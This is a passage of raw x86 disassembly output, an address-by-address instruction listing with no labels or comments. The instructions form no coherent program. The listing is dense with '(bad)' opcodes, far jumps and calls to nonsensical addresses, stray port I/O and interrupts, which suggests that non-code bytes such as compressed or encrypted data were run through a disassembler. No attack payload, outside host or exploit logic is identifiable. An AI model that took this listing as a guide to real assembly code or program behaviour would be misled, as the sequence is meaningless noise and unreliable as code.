  413ba2:	lods   eax,DWORD PTR ds:[esi]
  413ba3:	(bad)  
  413ba4:	(bad)  [ebx]
  413ba6:	mov    ds:0x481d959b,al
  413bab:	stos   BYTE PTR es:[edi],al
  413bac:	sbb    ebx,DWORD PTR [eax+0x6055a0c1]
  413bb2:	sbb    DWORD PTR [ebx-0x15],ebp
  413bb5:	mov    esp,0x92b9cc1c
  413bba:	lea    esi,[ebx+eax*8-0x51db6cba]
  413bc1:	call   0xf0c49a13
  413bc6:	in     al,dx
  413bc7:	rcr    DWORD PTR [edx],cl
  413bc9:	adc    BYTE PTR [ebx],ch
  413bcb:	mov    edx,0x20f78563
  413bd0:	lea    edx,[esi]
  413bd2:	fisub  DWORD PTR [esi-0x57]
  413bd5:	mov    ebp,0x57e4f040
  413bda:	stos   BYTE PTR es:[edi],al
  413bdb:	mov    ds:0x97e9426b,eax
  413be0:	inc    ebp
  413be1:	xor    al,0x68
  413be3:	mov    ebx,DWORD PTR [ecx+edi*1+0xe]
  413be7:	aas    
  413be8:	jns    0x413c0a
  413bea:	cmp    dh,dl
  413bec:	in     eax,dx
  413bed:	pop    edi
  413bee:	push   ecx
  413bef:	pop    eax
  413bf0:	adc    eax,0xf10b94c8
  413bf5:	(bad)  
  413bf6:	dec    esp
  413bf7:	inc    ebx
  413bf8:	out    dx,eax
  413bf9:	mov    edi,esp
  413bfb:	mov    esi,0x70c2fdea
  413c00:	scas   al,BYTE PTR es:[edi]
  413c01:	enter  0x7ac2,0x47
  413c05:	in     al,0xc9
  413c07:	pop    ss
  413c08:	daa    
  413c09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c0a:	push   ss
  413c0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c0c:	pop    ebp
  413c0d:	mov    ah,0x75
  413c0f:	mov    ebx,0x6fd4071
  413c14:	ins    DWORD PTR es:[edi],dx
  413c15:	pushf  
  413c16:	mov    al,0x7c
  413c18:	fiadd  DWORD PTR [ebx+0x2c]
  413c1b:	fdivp  st(3),st
  413c1d:	add    al,0x50
  413c1f:	sbb    BYTE PTR [ebx+esi*1-0x7cf34ec2],al
  413c26:	ret    
  413c27:	inc    ebx
  413c28:	or     bl,BYTE PTR [esi+0x7e]
  413c2b:	cli    
  413c2c:	(bad)  
  413c2d:	push   esi
  413c2e:	cmc    
  413c2f:	ins    BYTE PTR es:[edi],dx
  413c30:	add    bh,cl
  413c32:	nop
  413c33:	add    BYTE PTR [ecx],dl
  413c35:	dec    ebp
  413c36:	pop    eax
  413c37:	inc    edx
  413c38:	sub    ecx,eax
  413c3a:	sar    BYTE PTR [edx],0x27
  413c3d:	jbe    0x413c36
  413c3f:	scas   eax,DWORD PTR es:[edi]
  413c40:	mov    eax,0x85c6edf9
  413c45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c46:	(bad)
  413c49:	pop    es
  413c4a:	stos   DWORD PTR es:[edi],eax
  413c4b:	mov    dh,0x84
  413c4d:	sbb    eax,0xcbbe3088
  413c52:	ins    DWORD PTR es:[edi],dx
  413c53:	inc    esi
  413c54:	mov    DWORD PTR [ebx+0x76037e38],esp
  413c5a:	xchg   esi,eax
  413c5b:	or     DWORD PTR [edx],0xfffffff7
  413c5e:	fs push ds
  413c60:	test   eax,0x60f8dc76
  413c65:	(bad)  
  413c67:	test   BYTE PTR [ebx*2-0x407116df],0x5d
  413c6f:	mov    esp,0xe5b26133
  413c74:	into   
  413c75:	or     al,0xb
  413c77:	js     0x413c88
  413c79:	daa    
  413c7a:	pusha  
  413c7b:	and    BYTE PTR [ecx+esi*8+0x245d3ee4],cl
  413c82:	mov    esp,0xd8b6261c
  413c87:	mov    eax,0x5c3144c1
  413c8c:	or     DWORD PTR [ecx-0x55],esi
  413c8f:	lahf   
  413c90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c91:	mov    ch,0xd9
  413c93:	outs   dx,DWORD PTR ds:[esi]
  413c94:	dec    esp
  413c95:	jle    0x413c6b
  413c97:	scas   al,BYTE PTR es:[edi]
  413c98:	fwait
  413c99:	add    edx,ecx
  413c9b:	xor    DWORD PTR [edx],ebx
  413c9d:	sbb    BYTE PTR [edi-0x13],al
  413ca0:	addr16 mov ecx,0x6c4bc1a9
  413ca6:	shl    DWORD PTR [edi-0x36f57bf2],1
  413cac:	sbb    al,0x66
  413cae:	mov    eax,ds:0x7b743865
  413cb3:	xchg   ebp,eax
  413cb4:	addr16 pop ds
  413cb6:	adc    al,0x36
  413cb8:	dec    esi
  413cb9:	mov    dl,BYTE PTR [ecx-0x6ed6fc59]
  413cbf:	mov    esi,0xcbf6b539
  413cc4:	fsubr  DWORD PTR [edx]
  413cc6:	inc    ecx
  413cc7:	inc    eax
  413cc8:	xor    dh,0x59
  413ccb:	xor    DWORD PTR [esi-0x5fa1446f],ecx
  413cd1:	push   edx
  413cd2:	push   ebx
  413cd3:	xchg   DWORD PTR [edx],esi
  413cd5:	mov    dh,BYTE PTR [edi-0x15eacac7]
  413cdb:	jno    0x413ca4
  413cdd:	jmp    0x413c6c
  413cdf:	fsub   DWORD PTR [ecx]
  413ce1:	scas   al,BYTE PTR es:[edi]
  413ce2:	mov    eax,ds:0xaa817940
  413ce7:	test   edi,ebp
  413ce9:	popa   
  413cea:	das    
  413ceb:	test   DWORD PTR [esi+edx*8-0x490daf2e],ecx
  413cf2:	xor    ebx,DWORD PTR [ebp+0x3e38cd4]
  413cf8:	int    0xc5
  413cfa:	pop    ss
  413cfb:	fld    QWORD PTR [ecx-0x6a3ebae3]
  413d01:	xchg   DWORD PTR [ecx],eax
  413d03:	pushf  
  413d04:	imul   ebx,ecx,0xca5c7d64
  413d0a:	pop    DWORD PTR [esi]
  413d0c:	stos   BYTE PTR es:[edi],al
  413d0d:	mov    ecx,0xd759c8c1
  413d12:	std    
  413d13:	mov    WORD PTR [eax+0x3cf50765],fs
  413d19:	scas   eax,DWORD PTR es:[edi]
  413d1a:	scas   al,BYTE PTR es:[edi]
  413d1b:	jge    0x413ce6
  413d1d:	push   cs
  413d1e:	xchg   DWORD PTR [ebx-0x28],esp
  413d21:	sub    BYTE PTR [ecx],0xa0
  413d24:	popa   
  413d25:	add    bl,BYTE PTR [ecx]
  413d27:	stos   BYTE PTR es:[edi],al
  413d28:	xlat   BYTE PTR ds:[ebx]
  413d29:	push   edi
  413d2a:	add    eax,0x798061d5
  413d2f:	mov    ecx,0xdb79dfaa
  413d34:	jmp    0xe88ae20e
  413d39:	dec    ecx
  413d3a:	rcr    DWORD PTR es:[edx+0x54],0x30
  413d3f:	and    DWORD PTR [ebx-0x47],ebx
  413d42:	std    
  413d43:	jge    0x413cdc
  413d45:	sar    DWORD PTR [ecx+0x51],1
  413d48:	push   ds
  413d49:	xor    al,0x29
  413d4b:	aas    
  413d4c:	pop    esp
  413d4d:	pop    ds
  413d4e:	sbb    DWORD PTR [edi-0x22b6eefa],0x4facba77
  413d58:	and    al,0xcc
  413d5a:	inc    edi
  413d5b:	lock stos BYTE PTR es:[edi],al
  413d5d:	popf   
  413d5e:	and    ch,al
  413d60:	scas   al,BYTE PTR es:[edi]
  413d61:	dec    edx
  413d62:	sbb    al,0xbe
  413d64:	dec    ecx
  413d65:	into   
  413d66:	test   DWORD PTR [ebp+0x4b],esi
  413d69:	mov    ds:0xfb36f290,eax
  413d6e:	push   ecx
  413d6f:	cmp    BYTE PTR [ebp+0x35],0xc1
  413d73:	push   ds
  413d74:	dec    ebp
  413d75:	lahf   
  413d76:	or     DWORD PTR [edi+0x1a],esp
  413d79:	jmp    0x413d7a
  413d7b:	adc    al,0x68
  413d7d:	add    ebx,edx
  413d7f:	int3   
  413d80:	mov    ebp,ebp
  413d82:	inc    edx
  413d83:	stos   BYTE PTR es:[edi],al
  413d84:	fdiv   DWORD PTR [ebx-0x5]
  413d87:	das    
  413d88:	cdq    
  413d89:	fist   DWORD PTR [ebx]
  413d8b:	fisubr DWORD PTR [edi]
  413d8d:	sub    eax,0x7e384eaf
  413d92:	fadd   DWORD PTR [edi+0x4cc3fc4f]
  413d98:	xor    BYTE PTR [ebx-0x6ecf5cbe],al
  413d9e:	(bad)  
  413da0:	popf   
  413da1:	popf   
  413da2:	push   0x6be521a0
  413da7:	popa   
  413da8:	lahf   
  413da9:	into   
  413daa:	push   esp
  413dab:	xlat   BYTE PTR ds:[ebx]
  413dac:	cmp    DWORD PTR [eax+0x6a50e360],ebx
  413db2:	add    esp,DWORD PTR [ebx+0x32597533]
  413db8:	mov    dh,0xc8
  413dba:	bound  eax,QWORD PTR [esi+edi*1]
  413dbd:	fs adc al,0x46
  413dc0:	inc    esi
  413dc1:	hlt    
  413dc2:	cmp    DWORD PTR [ebx+0x16],edx
  413dc5:	ret    
  413dc6:	outs   dx,DWORD PTR ds:[esi]
  413dc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413dc8:	inc    esi
  413dc9:	sahf   
  413dca:	jbe    0x413d4c
  413dcc:	out    dx,al
  413dcd:	push   edx
  413dce:	std    
  413dcf:	sbb    DWORD PTR [ebx-0x61],edx
  413dd2:	sub    bl,BYTE PTR [eax]
  413dd4:	ja     0x413df6
  413dd6:	push   edi
  413dd7:	dec    ecx
  413dd8:	mov    eax,ds:0x5a576895
  413ddd:	add    bl,al
  413ddf:	pop    ecx
  413de0:	mov    esi,0x6af8aff1
  413de5:	(bad)  
  413de6:	push   esi
  413de7:	dec    esi
  413de8:	mov    eax,0xf27594a0
  413ded:	stc    
  413dee:	jl     0x413e5e
  413df0:	mov    BYTE PTR [eax-0x1d],0x50
  413df4:	jbe    0x413da0
  413df6:	fcom   QWORD PTR [esi+0xe]
  413df9:	adc    cl,dl
  413dfb:	int    0x50
  413dfd:	push   ebx
  413dfe:	loope  0x413dc6
  413e00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e01:	xchg   ch,ah
  413e03:	sbb    al,0x67
  413e05:	xor    DWORD PTR [eax+0x26bd8c4e],ebx
  413e0b:	and    BYTE PTR [eax],cl
  413e0d:	shr    dl,0xc2
  413e10:	jmp    0xa7e5:0x2016cf9b
  413e17:	popa   
  413e18:	add    al,cl
  413e1a:	mov    esi,0xbbd8bff6
  413e1f:	out    0x5b,eax
  413e21:	int    0x2
  413e23:	xchg   DWORD PTR [ebp+0x7e15dde5],ecx
  413e29:	cld    
  413e2a:	push   0xffffffc3
  413e2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e2d:	sub    eax,DWORD PTR [eax-0x72fc9adc]
  413e33:	jns    0x413dc9
  413e35:	jecxz  0x413e53
  413e37:	add    esi,DWORD PTR [edi]
  413e39:	cmc    
  413e3a:	jmp    0x9c30:0x5d0d1aee
  413e41:	(bad)  
  413e42:	es loopne 0x413e8b
  413e45:	adc    al,0x9e
  413e47:	or     dh,ch
  413e49:	jp     0x413e40
  413e4b:	loop   0x413ebd
  413e4d:	leave  
  413e4e:	and    bh,cl
  413e50:	inc    esi
  413e51:	adc    al,0xf5
  413e53:	test   BYTE PTR [esi-0x20ec0a46],dl
  413e59:	xchg   ecx,eax
  413e5a:	(bad)  
  413e5b:	das    
  413e5c:	ins    DWORD PTR es:[edi],dx
  413e5d:	or     DWORD PTR [esi+0x66],0x8fdd61cf
  413e64:	adc    DWORD PTR [edx-0x6ee82a1e],ebp
  413e6a:	inc    ebp
  413e6b:	out    dx,eax
  413e6c:	aam    0xdd
  413e6e:	(bad)  
  413e6f:	cwde   
  413e70:	or     eax,0x2c0e8c4e
  413e75:	jle    0x413e43
  413e77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e78:	stos   BYTE PTR es:[edi],al
  413e79:	cli    
  413e7a:	jb     0x413e2e
  413e7c:	mov    ch,0x46
  413e7e:	mov    eax,0x3dcd3174
  413e83:	retf   
  413e84:	shl    DWORD PTR [ebx+0x17],cl
  413e87:	push   es
  413e88:	call   0x3f98:0x5ea81fbd
  413e8f:	test   DWORD PTR [esi+esi*8],ebx
  413e92:	(bad)  
  413e93:	push   ss
  413e94:	retf   
  413e95:	and    cl,BYTE PTR [ebp+0x603ad4a9]
  413e9b:	dec    eax
  413e9c:	xlat   BYTE PTR ds:[ebx]
  413e9d:	hlt    
  413e9e:	aas    
  413e9f:	retf   
  413ea0:	sti    
  413ea1:	mov    ebp,0xc1095ca1
  413ea6:	adc    edx,DWORD PTR [ebp+edi*1-0x1b]
  413eaa:	test   ecx,ebp
  413eac:	push   DWORD PTR [edi-0x4]
  413eaf:	mov    esp,0x597cca7e
  413eb4:	xchg   edi,eax
  413eb5:	bsr    esi,ecx
  413eb8:	add    al,0xec
  413eba:	push   edx
  413ebb:	cmp    dl,BYTE PTR [ecx]
  413ebd:	ret    
  413ebe:	and    eax,0xfc6094d9
  413ec3:	shufps xmm0,xmm5,0x56
  413ec7:	inc    eax
  413ec8:	fist   DWORD PTR [edi-0x3297a2a7]
  413ece:	cdq    
  413ecf:	aaa    
  413ed0:	adc    eax,0x453c467b
  413ed5:	out    dx,eax
  413ed6:	scas   eax,DWORD PTR es:[edi]
  413ed7:	stos   BYTE PTR es:[edi],al
  413ed8:	or     DWORD PTR [edi+0x27],edx
  413edb:	scas   al,BYTE PTR es:[edi]
  413edc:	test   eax,0xffdccd80
  413ee1:	mov    dh,0xed
  413ee3:	sar    BYTE PTR [ebx+0x7fd9cc6c],1
  413ee9:	loope  0x413f02
  413eeb:	dec    edx
  413eec:	xchg   edi,eax
  413eed:	dec    ebp
  413eee:	dec    ecx
  413eef:	xor    ch,0xfe
  413ef2:	cmp    BYTE PTR [ebp+0x5c1e75ec],bl
  413ef8:	jp     0x413eb4
  413efa:	push   esi
  413efb:	inc    edx
  413efc:	xchg   ebp,eax
  413efd:	call   0xcec0:0xa0e543f0
  413f04:	dec    bp
  413f06:	daa    
  413f07:	or     dh,BYTE PTR [edi+edi*1]
  413f0a:	mov    al,0xd
  413f0c:	test   BYTE PTR [edx+0x15c3bc02],0x1
  413f13:	xchg   esp,eax
  413f14:	push   ds
  413f15:	inc    esp
  413f16:	mov    dh,0xe7
  413f18:	mov    bh,0x61
  413f1a:	pop    esi
  413f1b:	jo     0x413ef2
  413f1d:	jmp    0x951a0408
  413f22:	in     al,dx
  413f23:	rol    ah,0xae
  413f26:	(bad)  
  413f28:	in     eax,0xe7
  413f2a:	mov    ch,0xa8
  413f2c:	sar    esp,cl
  413f2e:	pop    es
  413f2f:	xchg   edi,eax
  413f30:	dec    esi
  413f31:	push   esp
  413f32:	sub    dl,BYTE PTR [esi+ecx*2+0x6711aa92]
  413f39:	cmp    BYTE PTR [eax+0x43],bl
  413f3c:	ja     0x413ed6
  413f3e:	jmp    0x2b5f644e
  413f43:	out    0x63,al
  413f45:	int    0x7c
  413f47:	xchg   ebx,eax
  413f48:	pop    es
  413f49:	push   eax
  413f4a:	adc    ebx,DWORD PTR [ecx+0x72]
  413f4d:	jge    0x413fa3
  413f4f:	and    DWORD PTR [ecx],0xfffffff2
  413f52:	pop    eax
  413f53:	or     DWORD PTR [ecx-0x53],edx
  413f56:	pop    edi
  413f57:	call   esp
  413f59:	cmp    BYTE PTR [edi-0x79],al
  413f5c:	cmp    al,0xc8
  413f5e:	push   0x61
  413f60:	push   ds
  413f61:	fwait
  413f62:	jmp    0x413ee4
  413f64:	in     al,0x37
  413f66:	dec    edx
  413f67:	(bad)  
  413f68:	bound  edx,QWORD PTR [edx+0x4d5cfe17]
  413f6e:	cdq    
  413f6f:	outs   dx,DWORD PTR ds:[esi]
  413f70:	cli    
  413f71:	fs push es
  413f73:	pop    esp
  413f74:	ds xchg edx,eax
  413f76:	dec    esi
  413f77:	and    DWORD PTR [esi+0x5d],ebp
  413f7a:	fcomp  DWORD PTR [esi+0x4a29abc8]
  413f80:	nop
  413f81:	cmp    dh,BYTE PTR [ecx+0x5d2b3363]
  413f87:	ror    esi,0x1
  413f8a:	jge    0x413f38
  413f8c:	outs   dx,BYTE PTR ds:[esi]
  413f8d:	ror    BYTE PTR [esi+ebp*4-0x75],0xe
  413f92:	in     eax,dx
  413f93:	mov    eax,ds:0x70984ee1
  413f98:	cmp    al,0xa4
  413f9a:	lea    esp,[ecx-0x4d5acdfd]
  413fa0:	sti    
  413fa1:	jbe    0x413f38
  413fa3:	test   DWORD PTR [eax-0x27],edx
  413fa6:	retf   
  413fa7:	(bad)  
  413fa9:	or     al,0x6c
  413fab:	pop    edx
  413fac:	dec    esi
  413fad:	in     eax,0x1b
  413faf:	xor    DWORD PTR [edi],0xcb3c7438
  413fb5:	or     BYTE PTR [edx],ah
  413fb7:	cmp    bh,0x85
  413fba:	scas   eax,DWORD PTR es:[edi]
  413fbb:	ins    DWORD PTR es:[edi],dx
  413fbc:	xchg   BYTE PTR [esi-0x21293794],bl
  413fc2:	mov    ds:0xe2c1b6ac,eax
  413fc7:	ds test eax,0xd440114e
  413fcd:	rol    BYTE PTR [ebp+0x15],0x3d
  413fd1:	push   es
  413fd2:	aam    0x6a
  413fd4:	test   BYTE PTR [ebx+0x55],ch
  413fd7:	jp     0x413fc5
  413fd9:	mov    dh,0x23
  413fdb:	fwait
  413fdc:	cwde   
  413fdd:	mov    eax,ds:0xd660dac7
  413fe2:	or     ah,BYTE PTR [eax+0x7e]
  413fe5:	mov    dl,0xa4
  413fe7:	call   0x49b2:0x82e9cbea
  413fee:	nop
  413fef:	(bad)  
  413ff0:	retf   0x7516
  413ff3:	(bad)  
  413ff5:	sub    eax,0x87e0d580
  413ffa:	sbb    bh,ch
  413ffc:	call   0x6e3ca9ff
  414001:	jns    0x413ff6
  414003:	mov    ds:0xf7f0a579,eax
  414008:	jae    0x413fc2
  41400a:	adc    eax,0xca416cf8
  41400f:	push   es
  414010:	push   edx
  414011:	dec    ecx
  414012:	dec    ebp
  414013:	shl    DWORD PTR [esi],1
  414015:	(bad)  
  414016:	les    edx,FWORD PTR [ecx-0x41]
  414019:	aad    0x51
  41401b:	pushw  ds
  41401d:	scas   eax,DWORD PTR es:[edi]
  41401e:	pop    edx
  41401f:	or     eax,0x8ae7c092
  414024:	pop    ss
  414025:	xor    edx,DWORD PTR [ecx-0x2539ca34]
  41402b:	add    eax,DWORD PTR [ebx+0x5c407e50]
  414031:	test   DWORD PTR [edi-0x11],esp
  414034:	mov    WORD PTR [edx],ss
  414036:	dec    esp
  414037:	and    edi,DWORD PTR [esi+0x5e7a4a92]
  41403d:	mov    eax,ds:0x229e5816
  414042:	stos   BYTE PTR es:[edi],al
  414043:	sub    al,0xd0
  414045:	test   ebp,ebp
  414047:	rol    BYTE PTR [eax-0xe0f9c09],cl
  41404d:	fwait
  41404e:	(bad)  
  41404f:	loop   0x4140b2
  414051:	retf   0x79e8
  414054:	hlt    
  414055:	inc    ebp
  414056:	push   0xffffffd0
  414058:	sbb    al,0x64
  41405a:	aad    0xef
  41405c:	mov    esi,0xfe82b211
  414061:	sbb    dh,BYTE PTR [ebx+0x2a]
  414064:	push   ecx
  414065:	or     ebx,ebx
  414067:	and    al,0x76
  414069:	adc    esp,esi
  41406b:	(bad)  
  41406c:	xor    ebx,ebp
  41406e:	popa   
  41406f:	out    dx,al
  414070:	(bad)  [ecx+0x2b]
  414073:	aaa    
  414074:	icebp  
  414075:	fucomip st,st(6)
  414077:	push   ebx
  414078:	push   ecx
  414079:	cmp    al,0x8a
  41407b:	daa    
  41407c:	jo     0x41404c
  41407e:	pop    es
  41407f:	fdivr  DWORD PTR [edx-0x51]
  414082:	sbb    al,0xc3
  414084:	adc    BYTE PTR [esi+0x24],ch
  414087:	sar    DWORD PTR [ebp+0x2],1
  41408a:	or     eax,0x48c0f7c4
  41408f:	jg     0x41410c
  414091:	xchg   ecx,eax
  414092:	std    
  414093:	dec    ebp
  414094:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414095:	jle    0x41405d
  414097:	jnp    0x41406b
  414099:	loope  0x41405b
  41409b:	das    
  41409c:	inc    ebp
  41409d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41409e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41409f:	sub    BYTE PTR [edx-0x60f3ca44],cl
  4140a5:	in     al,0xa6
  4140a7:	jge    0x4140b5
  4140a9:	push   edi
  4140aa:	jge    0x4140ad
  4140ac:	jae    0x414069
  4140ae:	retf   0xee68
  4140b1:	inc    ebp
  4140b2:	mov    WORD PTR [ebp-0x4747d015],es
  4140b8:	lds    ebx,FWORD PTR ds:0x522733d3
  4140be:	gs xchg edi,eax
  4140c0:	pop    ss
  4140c1:	div    BYTE PTR [eax]
  4140c3:	imul   ebp,DWORD PTR [eax],0xf
  4140c6:	or     BYTE PTR [esi+0xb259eec],dl
  4140cc:	xor    BYTE PTR [esp+esi*1+0x15],0xc2
  4140d1:	mov    esp,0x4a271fc7
  4140d6:	mov    ds:0xf34bc7b7,al
  4140db:	mov    edi,0xddfc62eb
  4140e0:	jno    0x4140c7
  4140e2:	dec    edi
  4140e3:	jb     0x41410c
  4140e5:	push   ecx
  4140e6:	inc    ecx
  4140e7:	inc    edi
  4140e8:	daa    
  4140e9:	add    BYTE PTR [ebp+0x72811ea5],bl
  4140ef:	or     al,0xc8
  4140f1:	aaa    
  4140f2:	ret    
  4140f3:	or     dl,BYTE PTR [ebx]
  4140f5:	ror    dh,cl
  4140f7:	sti    
  4140f8:	daa    
  4140f9:	and    DWORD PTR [ebx-0x43],edi
  4140fc:	adc    BYTE PTR [ecx-0x33],bl
  4140ff:	mov    esp,0x95bb6a2f
  414104:	fisub  DWORD PTR [ebx-0x1a99759a]
  41410a:	mov    al,0xc
  41410c:	xchg   edx,eax
  41410d:	out    dx,eax
  41410e:	nop
  41410f:	out    dx,eax
  414110:	mov    es,WORD PTR [ebp+edx*4-0x1ed603f2]
  414117:	ja     0x4140cb
  414119:	jb     0x41417e
  41411b:	mov    eax,DWORD PTR [esi]
  41411d:	inc    ebp
  41411e:	test   DWORD PTR [eax*8-0x76623452],ebp
  414125:	xchg   edi,eax
  414126:	mov    ebp,0xfbd54eee
  41412b:	aad    0x43
  41412d:	imul   ebx,esp,0xffffff88
  414130:	add    al,0xe8
  414132:	(bad)  
  414133:	jne    0x4140ed
  414135:	(bad)
  414138:	ss sub al,0x61
  41413b:	cmp    eax,0x8a86563e
  414140:	mov    ds:0x3921df0b,al
  414145:	lods   al,BYTE PTR ds:[esi]
  414146:	mov    ecx,0x3fee69e4
  41414b:	packsswb mm6,QWORD PTR [edi]
  41414e:	fxch   st(7)
  414150:	inc    edi
  414151:	js     0x41413f
  414153:	mov    edx,0x5427517b
  414158:	shl    ah,1
  41415a:	push   cs
  41415b:	ror    cl,0xe8
  41415e:	push   ebx
  41415f:	out    0x2,eax
  414161:	mov    al,ds:0x16b2c230
  414166:	(bad)  
  414167:	inc    edi
  414168:	xchg   edi,eax
  414169:	sub    DWORD PTR [edx+edi*2+0xce9ff52],edx
  414170:	mov    cl,0xa8
  414172:	(bad)  
  414174:	popf   
  414175:	inc    ebp
  414176:	loop   0x414172
  414178:	les    eax,FWORD PTR [edx-0x1]
  41417b:	sub    bl,BYTE PTR [ebp-0x30a76c3]
  414181:	lods   eax,DWORD PTR ds:[esi]
  414182:	mov    cl,BYTE PTR [eax-0x54a8165c]
  414188:	cdq    
  414189:	addr16 ds xor al,0x2c
  41418d:	jnp    0x4141d5
  41418f:	in     al,0xa
  414191:	jno    0x4141c4
  414193:	cld    
  414194:	xor    BYTE PTR [ebx-0x1a],0x9f
  414198:	push   ecx
  414199:	or     eax,0xee77e2c3
  41419e:	jmp    0x8cfc:0xedf761f3
  4141a5:	retf   0xf69c
  4141a8:	adc    al,0x57
  4141aa:	cwde   
  4141ab:	cmc    
  4141ac:	and    DWORD PTR [ebp+0x1fbb1313],ebx
  4141b2:	nop
  4141b3:	add    eax,0x863bcf9b
  4141b8:	js     0x414187
  4141ba:	xor    eax,0xfdc7722e
  4141bf:	jl     0x414143
  4141c1:	push   ebp
  4141c2:	sar    ebp,0x88
  4141c5:	mov    ds:0x41fd67af,eax
  4141ca:	cld    
  4141cb:	mov    edx,0x4d17bab5
  4141d0:	fst    DWORD PTR [ebx+0x53]
  4141d3:	std    
  4141d4:	fs inc esi
  4141d6:	or     al,BYTE PTR [esi+0x7e]
  4141d9:	jp     0x414160
  4141db:	ret    
  4141dc:	mov    al,0xda
  4141de:	imul   eax,DWORD PTR [ebx-0x3c],0x7d
  4141e2:	push   eax
  4141e3:	outs   dx,DWORD PTR ds:[esi]
  4141e4:	bound  edi,QWORD PTR [ebp-0x50]
  4141e7:	sbb    BYTE PTR [ebx],bh
  4141e9:	pop    ebx
  4141ea:	cwde   
  4141eb:	mov    ?,WORD PTR [ebx-0x1e]
  4141ee:	popf   
  4141ef:	rcl    DWORD PTR [ebp+0x696fffab],0x82
  4141f6:	outs   dx,BYTE PTR ds:[esi]
  4141f7:	jns    0x41419f
  4141f9:	push   eax
  4141fa:	xchg   BYTE PTR [edi-0x17],bh
  4141fd:	lahf   
  4141fe:	inc    edx
  4141ff:	adc    eax,0xebef81b6
  414204:	and    ecx,ecx
  414206:	das    
  414207:	(bad)  
  414208:	(bad)  
  41420a:	js     0x4141c5
  41420c:	cmp    cl,BYTE PTR [edx+edi*1-0x11d598c7]
  414213:	sbb    al,0x69
  414215:	outs   dx,BYTE PTR ds:[esi]
  414216:	ret    
  414217:	data16 or al,0x96
  41421a:	mov    ch,0xd4
  41421c:	jno    0x4141d3
  41421e:	mov    dh,0x72
  414220:	mov    bl,0x2f
  414222:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414223:	xor    eax,0x3c3c7009
  414228:	mov    WORD PTR [ebx+0x14771e97],gs
  41422e:	push   edi
  41422f:	ss jle 0x41428d
  414232:	js     0x4141f0
  414234:	pusha  
  414235:	std    
  414236:	dec    esi
  414237:	jecxz  0x414266
  414239:	or     DWORD PTR [eax+0x1d],esp
  41423c:	popa   
  41423d:	(bad)  
  41423e:	xor    BYTE PTR [ebp+0x60a2f9bf],ah
  414244:	sbb    ebp,eax
  414246:	cmp    ch,BYTE PTR [ecx-0x3c]
  414249:	icebp  
  41424a:	jns    0x414242
  41424c:	sub    bl,BYTE PTR [edi]
  41424e:	(bad)  
  41424f:	xchg   esi,eax
  414250:	mov    edx,0x91ec0327
  414255:	cmp    ecx,ecx
  414257:	icebp  
  414258:	jle    0x414259
  41425a:	jmp    0x7d61:0x1417465f
  414261:	(bad)  
  414263:	pop    esi
  414264:	std    
  414265:	mov    ebx,0x688edd7b
  41426a:	mov    cl,BYTE PTR [ebp+0x7c]
  41426d:	add    dh,dl
  41426f:	mov    eax,ds:0x94afeaf0
  414274:	sti    
  414275:	addr16 ds out dx,al
  414278:	cmpps  xmm1,xmm3,0xb8
  41427c:	inc    esp
  41427d:	dec    ecx
  41427e:	in     al,dx
  41427f:	les    esp,FWORD PTR [esi+0x3104c2d0]
  414285:	nop
  414286:	pop    ss
  414287:	call   0x2f4af408
  41428c:	adc    bh,BYTE PTR [ebx]
  41428e:	mov    ch,0xa9
  414290:	ja     0x414278
  414292:	sbb    BYTE PTR [ecx-0x149862af],dl
  414298:	push   ebp
  414299:	addr16 int 0xdb
  41429c:	sar    DWORD PTR ds:0x5cb1c18a,0xe
  4142a3:	popa   
  4142a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142a5:	into   
  4142a6:	add    DWORD PTR [ebp+0x55beb6d0],0xaffcf7d5
  4142b0:	ss push cs
  4142b2:	call   0x3f96cf2d
  4142b7:	aad    0xc4
  4142b9:	and    BYTE PTR [ebx-0x25550bc],dl
  4142bf:	sbb    eax,0xe9d2396e
  4142c4:	xor    ch,BYTE PTR [ebx-0x7253eb6]
  4142ca:	add    esi,ebx
  4142cc:	cmp    BYTE PTR [edx-0x39639317],ch
  4142d2:	cs loop 0x41429c
  4142d5:	sub    al,0x2b
  4142d7:	scas   eax,DWORD PTR es:[edi]
  4142d8:	jmp    0x82ae:0x83da4428
  4142df:	pop    edi
  4142e0:	leave  
  4142e1:	aam    0xbb
  4142e3:	test   eax,0x391a8a9d
  4142e8:	sbb    al,0xd2
  4142ea:	xor    DWORD PTR [ebx+0x6e2a7414],esi
  4142f0:	inc    ebp
  4142f1:	push   eax
  4142f2:	jo     0x4142fe
  4142f4:	mov    DWORD PTR [esi+0x357f089f],edx
  4142fa:	lock fnsave [ebx-0x32b17217]
  414301:	cwde   
  414302:	into   
  414303:	repnz (bad) 
  414305:	push   ds
  414306:	sub    ebx,DWORD PTR [edi+0x2dba0621]
  41430c:	retf   
  41430d:	cli    
  41430e:	popa   
  41430f:	fimul  WORD PTR [ebx-0x2c]
  414312:	jmp    0xc85dcaf
  414317:	mul    DWORD PTR cs:[esi-0xd]
  41431b:	fdivr  QWORD PTR [eax]
  41431d:	adc    bl,bl
  41431f:	push   esp
  414320:	mov    bh,0x1f
  414322:	push   ebp
  414323:	mov    ds:0x775be547,al
  414328:	xlat   BYTE PTR ds:[ebx]
  414329:	les    eax,FWORD PTR [ebp+0x2552bd21]
  41432f:	xchg   ebp,eax
  414330:	or     BYTE PTR [edx-0x15],dl
  414333:	aad    0x2f
  414335:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414336:	stos   DWORD PTR es:[edi],eax
  414337:	je     0x4143b7
  414339:	test   DWORD PTR [edi-0x13],0x47b0c4f4
  414340:	and    BYTE PTR [edi-0xf],ah
  414343:	mov    WORD PTR [ebp+0x79a035f0],gs
  414349:	xchg   esi,eax
  41434a:	add    eax,0x68421caa
  41434f:	dec    edi
  414350:	scas   eax,DWORD PTR es:[edi]
  414351:	pop    ebp
  414352:	mov    esp,0x20ed54e1
  414357:	stos   BYTE PTR es:[edi],al
